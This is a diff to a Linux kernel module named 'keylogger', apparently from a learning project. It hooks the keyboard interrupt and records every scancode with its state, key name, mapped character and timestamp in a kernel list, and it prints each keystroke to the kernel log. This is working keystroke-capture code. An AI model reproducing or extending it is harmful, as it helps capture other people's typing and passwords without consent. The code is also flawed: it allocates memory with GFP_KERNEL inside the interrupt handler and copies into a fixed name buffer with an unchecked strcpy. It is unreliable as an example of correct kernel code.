@@ -45,15 +45,25 @@ t_keylst		*find_last_list_element(t_keylst *full_lst)
 		tmp_lst = tmp_lst->next;
 	return tmp_lst;
 }
-
-t_keylst		*init_node(t_keylst *node)
+/*
+char			*strcpy(char *dest, const char *src)
 {
-	node->key = 'q';
-	node->state = 'a';
-	node->value = 1;
-	node->name[0] = "h";
-//	node->time = NULL;
+	int i = -1;
+
+	while (src[++i])
+		dest[i] = src[i];
+	return dest;
+}
+*/
+t_keylst		*init_node(t_keylst *node, unsigned char scancode)
+{
+	node->key = scancode & KBD_SCANCODE_MASK;
+	node->state = scancode & KBD_STATUS_MASK;
+	strcpy(node->name, keyboard_name[scancode & KBD_SCANCODE_MASK]);
+	node->value = keyboard_map[scancode & KBD_SCANCODE_MASK];
+	getnstimeofday(&(node->time));
 	node->next = NULL;
+	printk(KERN_INFO "key [%d] state [%d] value [%c] name [%s] time [%ld]\n", node->key, node->state, node->value, node->name, node->time.tv_sec);
 	return node;
 }
 
@@ -64,7 +74,7 @@ int			add_to_list(unsigned char scancode)
 
 	if (!(new_node = (t_keylst *)kmalloc(sizeof(t_keylst), GFP_KERNEL)))
 		return 1;
-	new_node = init_node(new_node);
+	new_node = init_node(new_node, scancode);
 	if (k_lst == NULL)
 		k_lst = new_node;
 	else
@@ -73,7 +83,6 @@ int			add_to_list(unsigned char scancode)
 		tmp_lst = find_last_list_element(tmp_lst);
 		tmp_lst->next = new_node;
 	}
-	printk(KERN_INFO "[%d]\n", scancode & KBD_STATUS_MASK);
 	return 0;
 }
 
@@ -82,7 +91,7 @@ static irqreturn_t 	kbd_irq_handler(int irq, void* dev_id)
 	unsigned char /*status, */scancode;
 
 	scancode = inb(KEYBOARD_DATA);
-	printk(KERN_INFO "Scan Code %c %s\n",
+	printk(KERN_INFO "Scan Code %d %s\n",
             keyboard_map[scancode & KBD_SCANCODE_MASK],
             scancode & KBD_STATUS_MASK ? "Released" : "Pressed");
 	if (add_to_list(scancode))
@@ -95,10 +104,8 @@ static irqreturn_t 	kbd_irq_handler(int irq, void* dev_id)
 
 static int		__init keylogger_init(void)
 {
-	printk(KERN_INFO "in keylogger init function \n");
 	if (misc_register(&key_dev))
 		return 1;
-	printk(KERN_INFO "keylogger: name [%s] minor  [%i]\n", key_dev.name, key_dev.minor);
 	if (request_irq(KBD_IRQ, kbd_irq_handler, IRQF_SHARED, "keylogger", (void *)kbd_irq_handler))
 	{
 		printk(KERN_INFO "something went wrong in request_irq\n");
